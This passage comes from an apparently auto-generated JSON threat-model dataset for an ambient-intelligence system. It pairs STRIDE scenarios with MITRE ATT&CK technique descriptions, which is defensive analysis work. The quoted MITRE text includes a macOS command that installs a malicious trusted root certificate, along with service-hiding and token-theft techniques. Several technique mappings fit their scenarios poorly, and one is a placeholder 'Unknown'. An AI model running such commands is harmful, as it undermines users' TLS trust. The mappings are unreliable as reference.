                    "Role": "System Administrator",
                    "Condition": "Valid if authentication does not limit tried logins."
                }
            ],
            "Potential Impact": "Compromises system integrity and could lead to further security breaches.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Default Credentials",
                "Administrative Access",
                "Configuration Weakness"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a software bug to bypass access controls and gain privileged access.",
            "Assumptions": [
                {
                    "Assumption": "System software contains exploitable bugs.",
                    "Role": "System",
                    "Condition": "Valid if software updates and patches are not promptly applied."
                },
                {
                    "Assumption": "The attacker has the ability to identify and exploit these bugs.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has sophisticated knowledge."
                },
                {
                    "Assumption": "Access controls are implemented but not sufficiently tested.",
                    "Role": "System Administrator",
                    "Condition": "Valid if control mechanisms are weak or flawed."
                }
            ],
            "Potential Impact": "Compromises system integrity and may allow unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Software Vulnerability",
                "Access Control Bypass",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate user to access the AmI system by capturing and replaying biometric data.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data collection not properly encrypted.",
                    "Role": "System Designer",
                    "Condition": "Collected biometric data can be intercepted."
                },
                {
                    "Assumption": "Weakness in the biometric algorithm.",
                    "Role": "Software Developer",
                    "Condition": "Algorithm can be easily spoofed or replicated."
                }
            ],
            "Potential Impact": "Unauthorized access leading to potential information disclosure and compromising system integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric",
                "user impersonation",
                "data interception"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a stolen smart card to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "Smart card has been lost or stolen.",
                    "Role": "User",
                    "Condition": "No immediate deactivation or revocation of the smart card."
                },
                {
                    "Assumption": "Lack of multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "System does not require additional forms of authentication."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, potential data tampering, and breach of confidential information.",
            "MITRE ATT&CK Keywords": [
                "smart card",
                "impersonation",
                "unauthorized access",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Token Impersonation/Theft",
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
                "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
                "technique_id": "T1134.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to communication infrastructure by spoofing network devices.",
            "Assumptions": [
                {
                    "Assumption": "Insecure network device configurations.",
                    "Role": "Network Engineer",
                    "Condition": "Default credentials or outdated firmware."
                },
                {
                    "Assumption": "Lack of network monitoring.",
                    "Role": "IT Security",
                    "Condition": "No detection of abnormal network activities."
                }
            ],
            "Potential Impact": "Network traffic interception, leading to possible data exfiltration and loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "network spoofing",
                "device impersonation",
                "man-in-the-middle",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates sensor data to trigger false actions within the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Lack of sensor data integrity checks.",
                    "Role": "System Architect",
                    "Condition": "No validation or encryption of sensor data."
                },
                {
                    "Assumption": "Insecure sensor interfaces.",
                    "Role": "Hardware Engineer",
                    "Condition": "Open to tampering or easy physical access."
                }
            ],
            "Potential Impact": "Compromised data integrity leading to erroneous system behaviors and potential physical damage.",
            "MITRE ATT&CK Keywords": [
                "sensor data tampering",
                "data manipulation",
                "system integrity",
                "false actions"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies AI/ML model parameters to alter system decisions.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls on AI/ML models.",
                    "Role": "Data Scientist",
                    "Condition": "Models are exposed to unauthorized modifications."
                },
                {
                    "Assumption": "Lack of model integrity checks.",
                    "Role": "Software Developer",
                    "Condition": "No mechanism to verify the correctness of models."
                }
            ],
            "Potential Impact": "Erroneous system decisions, leading to potential security vulnerabilities and broken user trust.",
            "MITRE ATT&CK Keywords": [
                "AI tampering",
                "ML manipulation",
                "model corruption",
                "unauthorized modifications"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the configuration files stored in the cloud storage repository.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage permissions are poorly managed.",
                    "Role": "Cloud Administrator",
                    "Condition": "Inadequate access restrictions."
                },
                {
                    "Assumption": "No audit logging enabled for configuration changes.",
                    "Role": "Security Analyst",
                    "Condition": "Changes cannot be traced back."
                }
            ],
            "Potential Impact": "System misconfiguration leading to security loopholes and potential exploitation by attackers.",
            "MITRE ATT&CK Keywords": [
                "configuration tampering",
                "cloud storage",
                "access control",
                "unauthorized changes"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing specific actions within the system due to lack of proper logging.",
            "Assumptions": [
                {
                    "Assumption": "No proper logging and audit mechanism in place.",
                    "Role": "IT Security",
                    "Condition": "User actions cannot be tracked reliably."
                },
                {
                    "Assumption": "Weak authentication methods used.",
                    "Role": "System Administrator",
                    "Condition": "Actions cannot be accurately attributed to users."
                }
            ],
            "Potential Impact": "Inability to prove user actions leading to difficulties in incident investigation and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit logging",
                "user actions",
                "incident investigation"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions masquerading as legitimate users without leaving traceable logs.",
            "Assumptions": [
                {
                    "Assumption": "Logs are easily modifiable or deletable.",
                    "Role": "Database Administrator",
                    "Condition": "No protection on log files."
                },
                {
                    "Assumption": "Insufficient monitoring of suspicious activities.",
                    "Role": "Security Analyst",
                    "Condition": "No alerts on abnormal system use."
                }
            ],
            "Potential Impact": "Loss of traceability and accountability, making it hard to investigate and respond to security incidents.",
            "MITRE ATT&CK Keywords": [
                "masquerading",
                "repudiation",
                "log tampering",
                "suspicious activities"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A system administrator denies altering user access permissions due to lack of privilege access management.",
            "Assumptions": [
                {
                    "Assumption": "Lack of privileged access management controls.",
                    "Role": "IT Manager",
                    "Condition": "No monitoring of admin activities."
                },
                {
                    "Assumption": "Inadequate audit logging for critical actions.",
                    "Role": "IT Security",
                    "Condition": "Changes in permissions not logged."
                }
            ],
            "Potential Impact": "Failures in tracking unauthorized changes, resulting in increased security risks and loopholes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "privileged access",
                "audit logging",
                "permission alteration"
            ],
            "mitre_technique": {
                "name": "Hybrid Identity",
                "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",
                "id": "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f",
                "technique_id": "T1556.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted due to insufficient encryption during data transmission between sensors and data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System Architect",
                    "Condition": "Plain text transmission over insecure channels."
                },
                {
                    "Assumption": "Limited network security controls.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of secure communication protocols."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, risking privacy breaches and data exploitation.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "information disclosure",
                "unencrypted traffic",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to user profiles stored in cloud storage due to insufficient access controls.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate access control mechanisms.",
                    "Role": "Cloud Administrator",
                    "Condition": "Permissions too broad or not properly configured."
                },
                {
                    "Assumption": "Absence of data classification and handling policies.",
                    "Role": "Data Privacy Officer",
                    "Condition": "Lack of proper data segregation."
                }
            ],
            "Potential Impact": "Sensitive personal data exposure leading to user privacy violations and potential identity theft.",
            "MITRE ATT&CK Keywords": [
                "access control",
                "cloud storage",
                "user profiles",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the AI/ML model outputs in the system.",
            "Assumptions": [
                {
                    "Assumption": "Model outputs are not properly secured.",
                    "Role": "Data Scientist",
                    "Condition": "Outputs accessible without authentication."
                },
                {
                    "Assumption": "Lack of data access monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "No tracking of access to sensitive outputs."
                }
            ],
            "Potential Impact": "Unauthorized exposure of sensitive AI decisions and potential misuse of intelligence data.",
            "MITRE ATT&CK Keywords": [
                "AI/ML",
                "data exposure",
                "unauthorized access",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication infrastructure with excessive traffic, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Lack of network traffic monitoring.",
                    "Role": "Network Engineer",
                    "Condition": "Excessive traffic not detected and blocked."
                },
                {
                    "Assumption": "Inadequate load balancing and failover mechanisms.",
                    "Role": "System Architect",
                    "Condition": "System cannot handle traffic spikes."
                }
            ],
            "Potential Impact": "Service disruption leading to unavailability of critical system functionalities.",
            "MITRE ATT&CK Keywords": [
                "flooding",
                "DoS",
                "network traffic",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service attack is launched on the cloud storage repository, overwhelming it and causing service outages.",
            "Assumptions": [
                {
                    "Assumption": "Cloud repository lacks DDoS mitigation strategies.",
                    "Role": "Cloud Administrator",
                    "Condition": "No protective measures against DDoS attacks."
                },
                {
                    "Assumption": "Insufficient redundancy and disaster recovery planning.",
                    "Role": "IT Manager",
                    "Condition": "Single point failures not mitigated."
                }
            ],
            "Potential Impact": "Loss of access to stored data, affecting system operation and data availability.",
            "MITRE ATT&CK Keywords": [
                "distributed DoS",
                "cloud storage",
                "service outage",
                "data availability"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a zero-day vulnerability in IoT devices causing them to malfunction and become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities in device firmware.",
                    "Role": "Hardware Engineer",
                    "Condition": "Delay in applying security patches."
                },
                {
                    "Assumption": "Lack of monitoring for unusual device behavior.",
                    "Role": "IT Security",
                    "Condition": "No alert mechanisms for compromised devices."
                }
            ],
            "Potential Impact": "Device malfunctions leading to service unavailability and potential physical safety risks.",
            "MITRE ATT&CK Keywords": [
                "zero-day exploitation",
                "IoT devices",
                "malfunction",
                "service unavailability"
